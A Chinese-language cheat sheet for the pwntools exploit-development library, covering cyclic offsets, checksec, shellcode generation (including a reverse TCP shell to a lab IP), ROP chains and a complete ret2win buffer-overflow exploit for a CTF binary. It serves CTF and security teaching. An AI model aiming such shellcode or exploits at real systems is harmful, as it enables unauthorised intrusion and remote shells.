<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# pwntools 备忘单

[pwntools](https://github.com/Gallopsled/pwntools) 是一个用 Python 编写的一流的 CTF 框架和漏洞利用开发库。它专为快速原型设计、二进制利用 (pwn) 和逆向工程而设计，提供了一套全面的命令行工具（`pwn cyclic`、`pwn checksec`、`pwn asm`、`pwn shellcraft`）以及用于与本地进程和远程套接字交互的高级 Python API。

 - -

＃＃ 目录

- [核心能力](#核心能力)
- [安装](#安装)
- [命令行实用程序 (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic`（缓冲区偏移计算）](#pwn-cycl-buffer-offset-calculation)
  - [`pwn checksec`（缓解检查）](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` 和 `pwn disasm`（汇编器/反汇编器）](#pwn-asm--pwn-disasm-汇编器--反汇编器)
  - [`pwn shellcraft`（Shellcode 生成器）](#pwn-shellcraft-shellcode-generator)
  - [`pwn template`（利用骨架生成器）](#pwn-template-exploit-骨骼-生成器)
- [Python 漏洞利用开发工作流程](#python-exploit-development-workflow)
  - [进程和远程套接字连接](#process--remote-socket-connections)
  - [ELF 解析和符号](#elf-parsing--symbols)
  - [ROP链构建](#rop-chain-construction)
  - [打包和字节顺序 (`p32` / `p64`)](#packing--endianness-p32--p64)
- [完整的利用示例（缓冲区溢出 + ret2win）](#complete-exploit-example-buffer-overflow--ret2win)

---

## 核心能力

- **管道架构：** 用于与本地进程 (`process`)、远程 TCP 套接字 (`remote`) 和 SSH 会话 (`ssh`) 交互的统一接口。
- **二进制和小工具检查：** 自动 ELF 符号解析、GOT/PLT 查找和自动 ROP 链合成。
- **即时汇编：** 跨 x86、x86_64、ARM、MIPS 和 AArch64 的汇编助记符和操作码之间的即时转换。
- **Shellcode 合成：** 预构建的、可定制的 shellcode 模板，用于反向 shell、execve、文件读取和规避。

 - -

＃＃ 安装
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## 命令行实用程序 (`pwn <cmd>`)

### `pwn cyclic`（缓冲区偏移计算）
生成独特的 De Bruijn 循环模式以确定准确的崩溃偏移（EIP / RIP 覆盖）：
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec`（缓解检查）
检查任何 ELF 可执行文件的安全缓解措施（Canary、NX、PIE、RELRO、ASLR）：
```bash
pwn checksec /path/to/binary
```
### `pwn asm` 和 `pwn disasm`（汇编器/反汇编器）
直接从终端将指令组装成 shellcode 字节：
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft`（Shellcode 生成器）
直接将生产就绪的 shellcode 有效负载生成到终端 stdout 或二进制文件：
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template`（利用骨架生成器）
为目标二进制文件和远程服务器生成经过实战测试的 Python 漏洞利用模板：
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Python 漏洞利用开发工作流程

### 进程和远程套接字连接
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### ELF 解析和符号
自动读取函数地址、GOT 和 PLT 表，无需手动 GDB 查找：
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### ROP链构建
自动构建面向返回编程（ROP）链：
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### 打包和字节顺序 (`p32` / `p64`)
将整数内存地址转换为小端字节：
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## 完整的利用示例（缓冲区溢出 + ret2win）
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```